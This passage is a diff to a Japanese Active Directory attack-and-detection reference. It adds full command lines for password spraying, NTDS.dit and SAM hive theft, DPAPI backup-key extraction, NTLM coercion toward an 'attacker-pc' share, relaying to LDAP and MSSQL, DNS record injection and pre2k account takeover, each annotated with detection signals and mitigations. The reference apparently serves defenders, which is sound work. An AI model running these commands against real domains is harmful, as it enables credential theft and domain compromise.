+        "q": "Invoke-PasswordSprayOWA -ExchHostname mail.corp.local -UserList .\\userlist.txt -Password 'Season2024!' -Threads 15 -OutFile owa-sprayed-creds.txt"
+      },
+      {
+        "tool": "Hydra",
+        "t": "RDP(3389)への総当たり。認証失敗は4625に加えTerminalServices-RemoteConnectionManagerのログにも残る",
+        "q": "hydra -L users.txt -p 'Season2024!' rdp://10.0.0.50"
+      }
+    ],
     "detect": "複数アカウントにまたがる4771/4625の失敗を単一送信元IP・短時間で相関検知する。OWA/EWSはExchange/IISログでUser-Agentと認証失敗のバースト、同一ソースからの多数ユーザ試行をSIEMで相関する。badPwdCountの広範な微増を監視する。",
     "events": "4625 (logon failure), 4771 (Kerberos pre-auth failed), 4776 (NTLM認証), Exchange/IISログ (OWA/EWS 401)",
     "mitigate": "スマートロックアウト(Azure AD/オンプレ)とMFA(特にOWA/EWS)を全認証面に適用し、レガシー認証(Basic/EWS)を無効化する。強固なパスワードポリシーと侵害パスワード辞書ブロックを導入する。",
@@ -6747,6 +11090,38 @@ AD.I18N.ja.attacks = [
     "summary": "バックアップ特権を悪用しVSS/DCSyncを使わずにレジストリハイブ(SAM/SYSTEM)やNTDS.ditをファイルコピーで直接窃取する手法。Backup Operators等の悪用と直結する。",
     "how": "SeBackupPrivilege保持時、robocopy /b や esentutl /y、Win32 Backup APIでACLを迂回してロック中ファイルをコピーする。DCではdiskshadowでシャドウコピーを作成しNTDS.ditとSYSTEMハイブを抜き出し、secretsdumpでオフライン抽出する。メンバサーバではSAM/SYSTEM/SECURITYからローカル資格情報を回収する。",
     "tools": "robocopy /b, esentutl /y /vss, diskshadow, SeBackupPrivilegeCmdLets, impacket-secretsdump, reg save",
+    "cmd": [
+      {
+        "tool": "robocopy",
+        "t": "`/b`(バックアップモード)でACLとロックを無視しNTDS.ditを直接コピー。`/b`スイッチ自体が希少で強シグナル",
+        "q": "robocopy.exe C:\\Windows\\NTDS C:\\Windows\\Temp\\exfil ntds.dit /b"
+      },
+      {
+        "tool": "esentutl.exe",
+        "t": "VSS経由でロック中のntds.ditを複製。シャドウコピー作成イベントを伴わず`/vss`がコマンドラインの手掛かり",
+        "q": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit"
+      },
+      {
+        "tool": "esentutl.exe",
+        "t": "同技法をメンバーサーバのSAMハイブへ適用しローカル資格情報を窃取",
+        "q": "esentutl.exe /y /vss C:\\Windows\\System32\\config\\SAM /d C:\\Windows\\Temp\\SAM"
+      },
+      {
+        "tool": "diskshadow.exe",
+        "t": "スクリプトでシャドウコピーを作成しドライブを公開。実際のadd volume/expose指定は`/s`先のスクリプトファイル内にある",
+        "q": "diskshadow.exe /s C:\\Windows\\Temp\\ds.txt"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "SAM/SYSTEMハイブを標準APIでバックアップ保存。`reg save`が短時間で複数対象に並ぶのは強い予兆",
+        "q": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save\nreg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save"
+      },
+      {
+        "tool": "Impacket",
+        "t": "持ち出したハイブ/ntds.ditをオフライン解析。DC上にはこの工程のテレメトリは残らない",
+        "q": "secretsdump.py -sam sam.save -system system.save LOCAL"
+      }
+    ],
     "detect": "diskshadowの起動、esentutl/robocopyによるNTDS.ditやハイブへのアクセス、System32\\configやntds配下へのファイルアクセスをEDR/監査(4663)で検知する。バックアップ特権付与の割当(4672)とバックアップ製品以外のプロセスによる特権使用を相関する。",
     "events": "4672 (special privileges assigned), 4663 (object access to SAM/ntds.dit), Sysmon 1/11 (esentutl.exe, diskshadow.exe, robocopy /b)",
     "mitigate": "Backup Operators等SeBackupPrivilege保持グループのメンバーを厳格に最小化し、DCへの対話ログオン/リモート操作をTier0に限定する。バックアップは専用サービスアカウント+管理端末のみに限定し、diskshadow/esentutlの実行を制限する。",
@@ -6782,6 +11157,28 @@ AD.I18N.ja.attacks = [
     "summary": "DCが保持するDPAPIドメインバックアップキー(RSA PVK)を奪取し、全ドメインユーザのマスターキー・資格情報・シークレットを任意にオフライン復号できる別次元の手法。",
     "how": "ドメイン管理者権限でDCに対しmimikatz lsadump::backupkeys や SharpDPAPI backupkey /rpc(MS-BKRPプロトコル)でドメインバックアップキー(.pvk)を取得する。以後はどのユーザのDPAPIマスターキーもオフラインで復号でき、資格情報マネージャ・ブラウザ保存パスワード・証明書秘密鍵を横断的に復号する永続能力を得る。",
     "tools": "mimikatz (lsadump::backupkeys), SharpDPAPI (backupkey/masterkeys), impacket dpapi.py backupkeys",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "DCからDPAPIドメインバックアップキー(PVK)をLsaRetrievePrivateData経由で取得。`backupkeys`が決定的文字列",
+        "q": "mimikatz.exe \"lsadump::backupkeys /system:dc01.corp.local /export\" exit"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "同等の機能をC#で実装。`backupkey`サブコマンドと出力先`.pvk`が痕跡",
+        "q": "SharpDPAPI.exe backupkey /server:dc01.corp.local /file:key.pvk"
+      },
+      {
+        "tool": "SharpDPAPI",
+        "t": "MS-BKRPでDCに都度復号を依頼しPVKをローカルに保持しない低ノイズ版。`masterkeys /rpc`が特徴",
+        "q": "SharpDPAPI.exe masterkeys /rpc"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からMS-BKRPでバックアップキーを取得。DC側にプロセスログは残らずRPC呼び出しのみが手掛かり",
+        "q": "dpapi.py backupkeys -t corp.local/administrator@10.0.0.10 -o backupkeys"
+      }
+    ],
     "detect": "DCへのMS-BKRP(BackupKey Remote Protocol)呼び出しをTier0管理外プロセスから検知する。lsass/DCに対する異常なRPCアクセス、SharpDPAPIのRPC取得パターンをEDRで監視する。バックアップキーは一度漏洩すると再取得不能なため取得イベント自体を最重要視する。",
     "events": "4662 (BootKey/BackupKeyオブジェクトアクセス), lsass関連の異常アクセス, MS-BKRP RPCログ",
     "mitigate": "DCへの管理アクセスをTier0に厳格分離し、既に漏洩が疑われる場合はドメインバックアップキーのロールオーバー(実質的に困難で計画的対応が必要)を検討する。EDRでlsass/DCのRPCを保護し、ドメイン管理者数を最小化する。",
@@ -6822,6 +11219,33 @@ AD.I18N.ja.attacks = [
     "summary": "Windows 10/11でSAM/SYSTEM/SECURITYハイブにBUILTIN\\Usersが読取ACLを持つ誤設定により、シャドウコピー経由で非管理者がローカル資格情報を窃取できるCVE。",
     "how": "脆弱ホストで既存のVSSシャドウコピー(\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM)を非管理者権限で読み出す。ハイブからローカルアカウントのNTハッシュ、LSAシークレット(マシンのDPAPI_SYSTEM鍵を含む)、キャッシュ済みドメイン資格情報を抽出し、Pass-the-Hashやローカル権限昇格に用いる(ユーザーのDPAPIマスターキー自体はプロファイル内にあり別途取得が必要)。システム復元ポイントが存在すれば標準ユーザで成立する。",
     "tools": "HiveNightmare(seri#$hive), mimikatz, impacket-secretsdump, PowerShell VSSアクセス",
+    "cmd": [
+      {
+        "tool": "HiveNightmare",
+        "t": "非管理者のままシャドウコピー経由でSAM/SECURITY/SYSTEMを複製。カレントに`*-haxx`ファイルが生成される",
+        "q": "HiveNightmare.exe"
+      },
+      {
+        "tool": "HiveNightmare",
+        "t": "参照するシャドウコピーの世代を指定する版。復元ポイントが複数残る古い端末で有効",
+        "q": "HiveNightmare.exe 3"
+      },
+      {
+        "tool": "vssadmin.exe",
+        "t": "悪用前提のシャドウコピー存在確認。非管理者アカウントによる単体実行は通常運用にほぼ現れない",
+        "q": "vssadmin.exe list shadows"
+      },
+      {
+        "tool": "Impacket",
+        "t": "複製したハイブをオフライン解析しNTハッシュ/LSAシークレットへ変換",
+        "q": "secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "同ハイブをmimikatzでオフライン解析する代替経路。`/sam:`と`/system:`の組み合わせが手掛かり",
+        "q": "mimikatz.exe \"lsadump::sam /sam:SAM-haxx /system:SYSTEM-haxx\" exit"
+      }
+    ],
     "detect": "System32\\config配下のSAM/SYSTEM/SECURITYへの非管理者プロセスによる読取、GLOBALROOT/ShadowCopyパスへのアクセスをSysmon/EDRで検知する。標準ユーザプロセスによるハイブファイルオープンを異常とする。",
     "events": "4663 (SAM/SYSTEM/SECURITYへのアクセス), Sysmon 11/1 (ShadowCopyパスアクセス)",
     "mitigate": "MS修正パッチを適用し、icacls %windir%\\system32\\config\\*.* /inheritanceで過剰ACLを削除する。既存のVSSシャドウコピーを削除(vssadmin delete shadows)して残存露出を除去する。",
@@ -6857,6 +11281,28 @@ AD.I18N.ja.attacks = [
     "summary": "Outlookの予定表リマインダのUNCサウンドパス(PidLidReminderFileParameter)を経由し、ユーザ操作なしで被害者のNet-NTLMハッシュを攻撃者サーバへ強制送信させるメール型強制認証。",
     "how": "細工した予定/タスクメールにPidLidReminderFileParameterとしてUNCパス(\\\\attacker\\share\\x.wav)とPidLidReminderOverrideをTrueで設定して送信する。Outlookがリマインダを処理する時点で被害者はメール閲覧すら不要にSMBでUNCへ認証し、Net-NTLMv2が攻撃者に漏れる。取得ハッシュはリレー(ESC8/LDAP)やオフラインクラックに用いる。",
     "tools": "OutlookSpy/カスタムMAPIスクリプト, responder/impacket-ntlmrelayx, CVE-2023-23397.ps1(検査/PoC)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "予定表アイテムのReminderSoundFileにUNCパスを設定し送信。`ReminderSoundFile`のUNC値がメールゲートウェイ側で検査対象",
+        "q": "Send-CalendarNTLMLeak -recipient 'victim@corp.local' -remotefilepath '\\\\attacker-pc\\share\\x.wav' -meetingsubject 'Sync' -meetingbody 'Sync'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "送信せずローカル.msgとして保存する亜種。ファイル配布型フィッシングに使われ添付物のプロパティ検査で発見できる",
+        "q": "Save-CalendarNTLMLeak -remotefilepath '\\\\attacker-pc\\share\\x.wav' -meetingsubject 'Sync' -meetingbody 'Sync'"
+      },
+      {
+        "tool": "Responder",
+        "t": "リマインダ発火時にOUTLOOK.EXEが自動送信するNet-NTLMv2を捕捉。被害者操作なしのSMB(445)着信が起点",
+        "q": "responder -I eth0 -wrf"
+      },
+      {
+        "tool": "Impacket",
+        "t": "捕捉した認証をLDAPへ中継し昇格。予定表メール受信からのSMB発信という異常な445相関で気づける",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --escalate-user svc_user"
+      }
+    ],
     "detect": "Microsoft提供のスクリプト(CVE-2023-23397.ps1)でメールボックス内の悪性PidLidReminderFileParameterを持つアイテムを走査する。クライアントから外部/内部の非承認SMB(445)へのアウトバウンド認証、Responderへの接続を検知する。",
     "events": "5145/4624 Type3 (SMB認証), ファイアウォールのアウトバウンド445, Exchangeメッセージトレース",
     "mitigate": "Outlook/Exchangeのセキュリティ更新を適用し、境界で外部445アウトバウンドをブロックする。高特権ユーザをProtected Usersに追加しNTLMを無効化、Block NTLMポリシーを適用する。",
@@ -6887,6 +11333,28 @@ AD.I18N.ja.attacks = [
     "summary": "ドメイン参加ホストをコアーシオンで自分自身へSMB認証させ、そのホスト自身のKerberos(またはNTLM)チケットを同一ホストのSMBへ反射(リフレクト)リレーする脆弱性。反射された認証はローカル認証として扱われ、SMB署名が未強制のホストでNT AUTHORITY\\SYSTEMに昇格する。任意の有効なドメインユーザーが1つあれば成立し、送信元=宛先の同一ホストでのみ機能する点が特徴。CVE-2025-33073。",
     "how": "Coercer/PetitPotam等でMS-EFSR(EFSRPC)やMS-RPRN(PrinterBug)を用いてドメイン参加ホストを強制認証させ、そのホストのKerberos AP-REQ(またはNTLM認証)を捕捉する。細工したマーシャル済みターゲット情報を含むSPN/名前を用いて、その認証を発信元ホスト自身のSMBサービスへ反射リレーすると、ホストは自分自身のチケットをローカル認証として受理し、SYSTEMとしてSMBセッションが確立される。従来から遮断されてきたNTLM単体のリフレクション(MS08-068系)とは異なり、Kerberosリレー経路を主軸とする点が新しい。SMB署名が未強制で、かつ送信元と宛先が同一ホストの場合にのみ成立する。",
     "tools": "impacket-ntlmrelayx(reflection対応), PetitPotam/Coercer, krbrelayx",
+    "cmd": [
+      {
+        "tool": "wspcoerce",
+        "t": "RedTeam Pentesting製の専用コアーサ。細工したマーシャル済みホスト名をfile://パスへ埋め込み対象へ強制認証させる",
+        "q": "wspcoerce 'corp.local/svc_user:Passw0rd!@client01.corp.local' 'file:////<ENCODED-TARGET-NAME>/x'"
+      },
+      {
+        "tool": "Pretender",
+        "t": "細工ホスト名をワイルドカードで名前解決乗っ取り、対象からの認証を確実に自ホストへ誘導。`--spoof`のワイルドカード指定が固有",
+        "q": "pretender -i eth1 --no-dhcp-dns --no-timestamps --spoof '*<ENCODED-TARGET-NAME>*'"
+      },
+      {
+        "tool": "krbrelayx",
+        "t": "捕捉したKerberos認証を送信元ホスト自身のSMBへ反射リレー。`--target smb://`が発信元=宛先の同一ホストを指す点が異常",
+        "q": "krbrelayx.py --target smb://client01.corp.local -c whoami"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "専用ツールがない場合の汎用コアーシオン代替。同型の反射は成立するがwspcoerceほど確実ではない",
+        "q": "python3 PetitPotam.py client01.corp.local '\\\\attacker-pc\\share\\x'"
+      }
+    ],
     "detect": "同一ホスト内で外部トリガによる自己宛のSMB認証(送信元=宛先のループバック的な4624 Type3と、その直前のコアーシオンRPC)を検知する。反射リレーではホスト自身のKerberos(またはNTLM)認証が自分へ返るため、直前のMS-EFSR(EFSRPC)/MS-RPRN等の強制認証RPCと、直後の自ホスト宛SYSTEMセッション確立(5145)を相関する。",
     "events": "4624 Type3 (自ホスト宛), 5145, EFSRPC/PrinterBug RPC呼び出しログ",
     "mitigate": "2025年6月10日(6月パッチチューズデー)公開のCVE-2025-33073向けセキュリティ更新を適用する。この更新は、マーシャル済みターゲット情報を伴うSMB接続を遮断することで反射そのものを防ぐ。恒久的な緩和は全ホストでのSMB署名の必須化であり、加えてExtended Protection for Authentication(EPA)を有効化し、コアーシオン経路(MS-EFSR/EFSRPC、MS-RPRN PrinterBug)を封じる。",
@@ -6927,6 +11395,28 @@ AD.I18N.ja.attacks = [
     "summary": "認証済みユーザがAD統合DNSゾーンへ動的更新で任意レコード(ワイルドカード/WPAD)を追加し、ネームレゾリューションを乗っ取ってトラフィックを傍受・リレーする手法。",
     "how": "既定でAuthenticated UsersがAD統合DNSゾーンにレコードを作成できる権限を悪用し、Invoke-DNSUpdateやdnstool.pyでワイルドカード(*)やWPADレコードを注入する。GlobalQueryBlockListでWPADが保護されていてもワイルドカードで包括的に名前解決を奪取し、LLMNR/mDNS無効環境でもキャプチャ/リレーが可能になる。",
     "tools": "Invoke-DNSUpdate (Powermad/DNS), krbrelayx dnstool.py, aiodnsbrute, Responder(捕捉側)",
+    "cmd": [
+      {
+        "tool": "Powermad",
+        "t": "動的更新でWPADレコードを新規追加。Authenticated Usersの子オブジェクト作成権限だけで成立する既定の弱点",
+        "q": "Invoke-DNSUpdate -DNSType A -DNSName wpad -DNSData 10.0.0.66"
+      },
+      {
+        "tool": "krbrelayx",
+        "t": "LDAP経由でワイルドカードAレコードを直接注入。`-r \"*.domain\"`が名前解決全乗っ取りの決定的シグナル",
+        "q": "python3 dnstool.py -u corp.local\\\\svc_user -p 'Passw0rd!' -r \"*.corp.local\" -d 10.0.0.66 -a add dc01.corp.local"
+      },
+      {
+        "tool": "krbrelayx",
+        "t": "投入前のゾーン一覧・既存レコード偵察。`--print-zones`はLDAP検索としてのみ残り実行ファイルの痕跡はない",
+        "q": "python3 dnstool.py -u corp.local\\\\svc_user -p 'Passw0rd!' --print-zones dc01.corp.local"
+      },
+      {
+        "tool": "Responder",
+        "t": "乗っ取った名前解決先で認証を捕捉する受け手側",
+        "q": "responder -I eth0 -wrf"
+      }
+    ],
     "detect": "DNSサーバのdnsServerLog/監査でワイルドカード(*)やWPADレコードの動的登録、一般ユーザによるレコード追加を検知する。ADIDNSゾーン内の異常な新規レコード(短TTL・攻撃者IP)を定期監査する。",
     "events": "DNS Server監査 515/516(レコード作成/削除), 513/514(ゾーン操作), 5136(dnsNodeオブジェクト変更), 4662",
     "mitigate": "GlobalQueryBlockListにwpad/isatapを維持しワイルドカードクエリブロックを検討する。ADIDNSゾーンのACLを見直し動的更新をSecure-onlyかつ最小権限に制限、既存の不審レコードを削除する。",
@@ -6957,6 +11447,28 @@ AD.I18N.ja.attacks = [
     "summary": "書込可能共有に細工ファイル(SCF/.library-ms/.url/LNK/desktop.ini)を設置し、フォルダ閲覧時にexplorerが攻撃者UNCへNet-NTLM認証を強制する古典的コアーシオン。",
     "how": "誰でも書込可能なファイル共有にアイコン/サウンド/ライブラリ参照が攻撃者UNC(\\\\attacker\\share)を指す.SCF, .library-ms, .url, .lnk, desktop.iniを設置する。被害者がフォルダを開くとexplorerがプレビュー/アイコン解決のためSMB認証し、Net-NTLMv2がResponderに漏れ、リレーやクラックに繋がる。",
     "tools": "ntlm_theft, Farmer, Lnkbomb, responder/ntlmrelayx, Snaffler(書込共有発見)",
+    "cmd": [
+      {
+        "tool": "ntlm_theft",
+        "t": "SCF/.library-ms/.url/LNK等21種の罠ファイルを一括生成。`-g all`実行自体はホスト単体では検知できず設置先共有側で見る",
+        "q": "python3 ntlm_theft.py -g all -s 10.0.0.66 -f invoice"
+      },
+      {
+        "tool": "Farmer",
+        "t": "生成した罠が指すWebDAV/HTTPリスナー。ポート番号のみを引数に取る単純さが逆に識別しづらい",
+        "q": "Farmer.exe 80 0 C:\\\\Windows\\\\Temp\\\\farmer.log"
+      },
+      {
+        "tool": "Lnkbomb",
+        "t": "書込可能共有へ悪意LNKを配置。`--windows`はWindows共有向けアップロードを示す固有引数",
+        "q": "python3 lnkbomb.py -t 10.0.0.50 -a 10.0.0.66 -s Shared -u svc_user -p 'Passw0rd!' -n dc01 --windows"
+      },
+      {
+        "tool": "Responder",
+        "t": "explorerのアイコン解決に伴うNet-NTLMv2を捕捉する受け手側",
+        "q": "responder -I eth0 -wrf"
+      }
+    ],
     "detect": "ファイル共有への.scf/.library-ms/.url/desktop.ini等の新規作成(FileServer監査/Sysmon 11)を検知する。ワークステーションから未知UNCへの多数のアウトバウンドSMB認証、Responderの応答IPへの接続を監視する。",
     "events": "5145 (共有ファイルアクセス), 4663/Sysmon 11 (共有への細工ファイル作成), 4624 Type3",
     "mitigate": "共有の書込ACLを最小化しユーザ書込可能な公開フォルダを削減する。境界/内部で外部445アウトバウンドを制限、SMB署名とEPAを強制する。高特権ユーザはProtected Users/Block NTLMで保護する。",
@@ -6997,6 +11509,28 @@ AD.I18N.ja.attacks = [
     "summary": "認証をNTLMv1に強制ダウングレードし、レスポンスがDES暗号に基づくためチャレンジ固定+crack.shでNTハッシュを完全復元する手法。",
     "how": "Responder等でチャレンジを固定値(1122334455667788)にしてNTLMv1認証を誘発し、コアーシオンで被害ホスト(特にDCマシンアカウント)のNet-NTLMv1レスポンスを収集する。DESベースのため固定チャレンジならcrack.shで確定的にNTハッシュを復元でき、そのままPass-the-HashやSilver Ticket、DCSyncに繋げる。",
     "tools": "Responder (--lm / challenge固定), impacket, crack.sh, hashcat (-m 5500), PetitPotam(強制)",
+    "cmd": [
+      {
+        "tool": "Responder",
+        "t": "チャレンジ固定+ESS無効化でNTLMv1を強制。`--lm --disable-ess`はcrack.sh向け確定的DES解読を前提とした組合せ",
+        "q": "responder -I eth0 --lm --disable-ess"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "DCマシンアカウント自身にNTLMv1レスポンスを出させる強制認証",
+        "q": "python3 PetitPotam.py dc01.corp.local '\\\\attacker-pc\\share\\x'"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "モード5500=NetNTLMv1。DES鍵空間の小ささからDCマシンアカウントでも比較的短時間で確定的復元が可能",
+        "q": "hashcat -m 5500 -a 0 ntlmv1.txt rockyou.txt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "復元したNTハッシュでDCSync。パスワード変更なしにハッシュのみで完全なドメイン権限に到達する最終段",
+        "q": "secretsdump.py -hashes :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA corp.local/DC01$@10.0.0.10 -just-dc"
+      }
+    ],
     "detect": "NTLMv1認証の発生自体をNetlogon/4624のパッケージ名やNTLM監査で検知する。固定チャレンジ(1122334455667788)を含むレスポンス、レガシーLmCompatibilityLevelのホストを棚卸しする。",
     "events": "8004/8003 (NTLM監査 Netlogon), 4624 (認証パッケージNTLMv1), Restrict NTLM監査ログ",
     "mitigate": "LmCompatibilityLevelを5(NTLMv2のみ、LM/NTLMv1拒否)に強制する。Restrict NTLM監査で残存NTLMv1を洗い出し廃止、Protected UsersとNTLM無効化を進める。",
@@ -7037,6 +11571,28 @@ AD.I18N.ja.attacks = [
     "summary": "同一ホストに対話ログオン中の管理者/DAのNTLM認証をDCOM/RPCで誘発し、クロスプロトコルでLDAP等へリレーしてドメイン権限を奪う局所特権昇格。",
     "how": "低権限で共有ホスト上のRPCSS/DCOMアクティベーションを悪用し、同ホストにログオン中の高特権ユーザ(管理者/DA)のNTLM認証をトリガする。そのNTLM認証をリモートの攻撃者リレー機に転送しLDAP/SMBへクロスセッションリレーしてRBCD付与やDCSync権限自付与に繋げる。LDAP署名/チャネルバインディング(EPA)が未強制のDCへのLDAPリレーで特に有効(SMB署名はSMBリレー側の防御でありLDAPリレーの成否とは無関係)。なおMicrosoftは2022年10月(21日)更新でこのクロスセッションDCOMリレー経路を無告知で緩和済み(CVE未採番。DCOM/RPCクライアントの認証レベルを引き上げてNTLM署名を有効化し、主要シナリオRPC→LDAPリレーを破壊)。このため現在は未適用機、または別コアーシオン(PetitPotam/LLMNR等)の認証トリガと組み合わせる形で成立し、未適用機ではEPA/LDAP署名の未強制が実質的な成否要因となる。",
     "tools": "RemotePotato0, impacket-ntlmrelayx (LDAPターゲット), socat(中継)",
+    "cmd": [
+      {
+        "tool": "RemotePotato0",
+        "t": "DCOMアクティベーションで同ホスト内の高権限ログオンのNTLM認証を誘発しリモートへ中継。`-m 0`がトリガ+中継の既定モード",
+        "q": "RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1"
+      },
+      {
+        "tool": "RemotePotato0",
+        "t": "誘発済みトラフィックを待ち受けるだけの捕捉専用モード。`-m 3`はトリガを伴わずノイズが少ない",
+        "q": "RemotePotato0.exe -m 3 -l 9997"
+      },
+      {
+        "tool": "Impacket",
+        "t": "受け取ったNTLMをLDAPへクロスプロトコル中継し権限昇格。宛先がDC、送信元がリレー機というIP不一致が手掛かり",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --escalate-user svc_user"
+      },
+      {
+        "tool": "socat",
+        "t": "リレー機とトリガ元ホストが別セグメントの場合のTCP転送。RPCポート9997への中継としてNW側に残る",
+        "q": "socat TCP-LISTEN:9997,fork,reuseaddr TCP:10.0.0.20:9997"
+      }
+    ],
     "detect": "対話ログオン中の特権ユーザ資格情報が別ホスト/DCへNTLMリレーされる兆候(短時間の異常なLDAP書込、RBCD属性変更)を検知する。共有端末上の低権限プロセスによるDCOMアクティベーションの異常を監視する。",
     "events": "5136 (msDS-AllowedToActOnBehalf変更), 4662 (WriteDACL/DCSync), 4624 Type3 (リレー先)",
     "mitigate": "EPAとLDAP署名/チャネルバインディングを強制しクロスプロトコルリレーを封じる。特権ユーザを共有端末に対話ログオンさせない(Tier分離)、Protected Users/NTLM無効化を適用する。",
@@ -7077,6 +11633,33 @@ AD.I18N.ja.attacks = [
     "summary": "SCCMクライアントプッシュインストールが行うサイトサーバ主導の認証を誘発してMSSQL/HTTP等へリレーし、またNAA資格情報を回収してドメイン横展開に繋げる攻撃面。",
     "how": "SharpSCCMのクライアントプッシュ強制でサイトサーバの管理アカウント(またはマシンアカウント)にコントロール下ホストへ認証させ、その認証をntlmrelayxでMSSQL(サイトDB)やHTTP(管理点)へリレーしてサイト管理権限やDBアクセスを得る。あわせて配布ポリシーからNAA資格情報を復号し、横展開に使える正規ドメインアカウントを回収する。",
     "tools": "SharpSCCM (invoke client-push), impacket-ntlmrelayx (MSSQL/HTTP), sccmhunter, PXEThief",
+    "cmd": [
+      {
+        "tool": "SharpSCCM",
+        "t": "クライアントプッシュを強制しサイトサーバの管理アカウントを攻撃者ホストへ認証させる。`invoke client-push -t`が固有の並び",
+        "q": "SharpSCCM.exe invoke client-push -t 10.0.0.66"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "管理点/サイトコードを明示した完全指定形。複数MPが存在する環境で標的を固定する際に使われる",
+        "q": "SharpSCCM.exe invoke client-push -mp sccm.corp.local -sc S01 -t 10.0.0.66"
+      },
+      {
+        "tool": "Impacket",
+        "t": "誘発したサイトサーバ認証をサイトDB(MSSQL)へ中継しxp_cmdshellで実行。宛先がSCCM DBサーバという点が特有",
+        "q": "ntlmrelayx.py -t mssql://10.0.0.20 -q \"exec master..xp_cmdshell 'whoami'\""
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "配布ポリシーからNetwork Access Account資格情報を復号取得。単体実行で完結し外部通信を伴わない",
+        "q": "SharpSCCM.exe get secrets"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "デバイス未登録環境向けにマシンアカウントで登録しつつ資格情報を取得。`-r`の新規デバイス名登録が痕跡",
+        "q": "SharpSCCM.exe get secrets -r newdevice -u chell$ -p 'Passw0rd!'"
+      }
+    ],
     "detect": "サイトサーバ/プッシュインストールアカウントによる予期しないホストへのアウトバウンド認証、MSSQLサイトDBへの異常なリレー接続を検知する。クライアントプッシュ設定の悪用、NAAアカウントの異常なログオン元を監視する。",
     "events": "4624/4648 (プッシュアカウント認証), MSSQL監査ログ, MP IISログ, 4662",
     "mitigate": "クライアントプッシュインストールを無効化する。やむを得ず残す場合はConfigMgr 2207以降の設定『NTLMへのフォールバック接続を許可(Allow connection fallback to NTLM)』を無効化し、サイトサーバのマシンアカウントによるNTLM強制認証を封じる。Enhanced HTTP/PKI+管理点認証へ移行し、NAAを廃止(またはログオン不可の最小権限アカウント化)、サイトサーバ/サイトDB通信にSMB署名・MSSQL/HTTPSのEPA・LDAP署名/チャネルバインディングを強制する。",
@@ -7117,6 +11700,28 @@ AD.I18N.ja.attacks = [
     "summary": "事前作成(pre-created)されたが未参加のコンピュータアカウントは既定パスワードが小文字コンピュータ名になることを悪用し、アカウントを掌握してRBCD等に繋げる手法。",
     "how": "userAccountControlにPASSWD_NOTREQDや未参加状態のフラグを持つコンピュータオブジェクトを列挙し、パスワード=小文字コンピュータ名(例: WKSTA01$のパスワードがwksta01)で認証を試みる。成功すればマシンアカウントを掌握し、そのアカウントでShadow Credentials/RBCD/委任設定を行いドメイン内横展開・昇格に繋げる。古いドメインの陳腐化アカウントで特に成立しやすい。",
     "tools": "pre2k, NetExec, impacket (changepasswd/getTGT), Rubeus",
+    "cmd": [
+      {
+        "tool": "pre2k",
+        "t": "事前作成コンピュータアカウントへ既定パスワード(小文字ホスト名)で一括認証を試行。`pre2k auth`という非定型なツール名自体が高感度",
+        "q": "pre2k auth -u 'WKSTA01$' -p 'wksta01' -d corp.local -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "NetExec",
+        "t": "LDAPで対象を列挙しつつ既定パスワードでの認証まで自動化。`-M pre2k`実行と成功時のTGT取得が異常な認証成功として残る",
+        "q": "nxc ldap 10.0.0.10 -u svc_user -p 'Passw0rd!' -M pre2k"
+      },
+      {
+        "tool": "Impacket",
+        "t": "特定した1台に対し個別に既定パスワードでTGT取得を試す。4768が成功しホスト以外からの認証元IPが手掛かりとなる",
+        "q": "getTGT.py corp.local/'WKSTA01$':'wksta01' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "取得したTGTを起点にShadow Credentials/RBCD設定へ連鎖。`/password:`に小文字ホスト名がそのまま入る特徴的な文字列",
+        "q": "Rubeus.exe asktgt /user:WKSTA01$ /password:wksta01 /domain:corp.local /dc:dc01.corp.local /nowrap"
+      }
+    ],
     "detect": "PASSWD_NOTREQDや長期間ログオンしていないコンピュータアカウントを棚卸しし、既定パスワード相当での認証成功(4624/4768)を検知する。マシンアカウント名と同一パスワードでの認証試行を監視する。",
     "events": "4768/4624 (マシンアカウント認証), 4741/4742 (作成/UAC変更), 陳腐化アカウント棚卸し",
     "mitigate": "コンピュータアカウントは参加時に管理者が事前作成し即時参加させ、PASSWD_NOTREQDや長期未使用アカウントを削除/無効化する。Delegation of joinを避け、pre2kスキャンを定期実施する。",
@@ -7157,6 +11762,28 @@ AD.I18N.ja.attacks = [
     "summary": "SPNを必要とせずユーザTGTを鍵としてTGSを取得するUser-to-User認証。Sapphire Ticket作成や特権チケット取得の基盤となる独立技術。",
     "how": "U2Uではサービスチケットをサービスのlongtermキーでなく相手ユーザのTGTセッション鍵で暗号化するため、SPN未登録のユーザに対してもS4U2self+U2Uを組み合わせて特権ユーザのPACを含むTGSを取得できる。これがSapphire Ticket(正規特権ユーザのPACを流用)やgetcredentialsのU2U利用の土台となる。",
     "tools": "Rubeus (asktgs /u2u, tgssub), impacket (getST -u2u), mimikatz",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "自ユーザーのTGTを鍵にU2U TGSを要求。SPN未登録ユーザーでも成立するため通常のKerberoast検知網をすり抜けやすい",
+        "q": "Rubeus.exe asktgs /u2u /targetuser:administrator /ticket:BASE64_TGT /nowrap"
+      },
+      {
+        "tool": "Rubeus",
